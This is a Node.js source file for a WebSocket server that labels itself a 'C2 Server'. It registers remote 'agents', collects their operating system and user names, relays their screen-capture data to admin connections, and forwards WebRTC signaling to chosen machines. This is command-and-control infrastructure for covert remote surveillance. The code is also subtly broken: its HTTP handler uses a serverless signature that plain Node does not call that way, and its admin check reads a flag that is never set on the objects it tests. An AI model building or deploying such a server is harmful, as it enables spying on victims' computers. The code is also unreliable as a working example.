const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');

// --- GLOBAL STATE ---
let clients = {}; // { id: { ws, info, isAdmin, lastSeen } }
let wss;

// Helper to read file safely
function readFileSafe(filePath) {
    try {
        return fs.readFileSync(filePath, 'utf8');
    } catch (e) {
        return null;
    }
}

// Initialize WebSocket Server
function initWSS(server) {
    if (wss) return wss;

    wss = new WebSocket.Server({ server });

    wss.on('connection', (ws, req) => {
        const id = uuidv4().substr(0, 8);
        clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };

        console.log(`[+] Client Connected: ${id}`);

        // Send registration confirmation back to the client
        ws.send(JSON.stringify({ type: 'registered', id: id }));

        ws.on('message', (msg) => {
            try {
                const data = JSON.parse(msg);

                // Check if this is an Admin connecting
                if (data.type === 'register_admin') {
                    clients[id].isAdmin = true;
                    console.log(`[ADMIN] Connected with ID: ${id}`);
                    broadcastToAdmin(id, { type: 'system', message: `Admin logged in` });
                    return;
                }

                // If it's an agent reporting in
                if (data.type === 'info') {
                    clients[id].info = data;
                    clients[id].lastSeen = Date.now();
                    
                    // Log it locally
                    console.log(`[ADMIN ALERT] 🟢 New User: ${data.os} (${data.user})`);
                    
                    // Broadcast to ALL admins so they see it in their grid/logs
                    notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
                    
                    // ALSO broadcast the full info object so the grid updates immediately
                    broadcastToAdmin(id, data); 
                } 
                // Forward signaling data (Offer/Answer/Candidate) between users
                else if (['offer', 'answer', 'candidate'].includes(data.type)) {
                    forwardToTarget(id, data);
                } 
                // General data broadcast (e.g., screen_data, ping, alert)
                else {
                    if (data.type === 'screen_data') {
                        console.log(`[DATA] Screen capture from ${id}`);
                    }
                    broadcastToAdmin(id, data);
                }
            } catch (e) {
                console.error("Message parsing error:", e);
            }
        });

        ws.on('close', () => {
            delete clients[id];
            notifyAdmin(id, '🔴 User Disconnected');
        });
    });

    return wss;
}

function notifyAdmin(id, msg) {
    console.log(`[ADMIN ALERT] ${msg}`);
    // Broadcast to all admins
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
        }
    });
}

function broadcastToAdmin(id, data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, ...data }));
        }
    });
}

function forwardToTarget(sourceId, data) {
    // If the data contains a specific target ID, send it there
    if (data.targetId && clients[data.targetId]) {
        const targetWs = clients[data.targetId].ws;
        if (targetWs.readyState === WebSocket.OPEN) {
            targetWs.send(JSON.stringify(data));
        }
    }
}

// Main Request Handler
const handler = async (event, context) => {
    const url = event.path || '/';
    
    // Serve Static Files Directly to avoid Express overhead/crashes
    if (url === '/admin.html' || url === '/index.html') {
        const filePath = path.join(__dirname, url);
        const content = readFileSafe(filePath);
        
        if (content) {
            return {
                statusCode: 200,
                headers: { 'Content-Type': 'text/html; charset=utf-8' },
                body: content
            };
        } else {
            return {
                statusCode: 404,
                body: 'File not found'
            };
        }
    }

    // Health Check
    if (url === '/health') {
        return {
            statusCode: 200,
            headers: { 'Content-Type': 'text/plain' },
            body: 'OK'
        };
    }

    // Default: Return a simple status or redirect
    return {
        statusCode: 200,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            status: 'running', 
            connectedClients: Object.keys(clients).length,
            timestamp: new Date().toISOString()
        })
    };
};

// Create HTTP Server
const server = http.createServer(handler);

// Initialize WS
initWSS(server);

// Local Development Listener
if (!process.env.VERCEL) {
    const PORT = process.env.PORT || 3000;
    server.listen(PORT, () => {
        console.log(`C2 Server running on port ${PORT}`);
    });
}

// Vercel Export
exports.handler = handler;
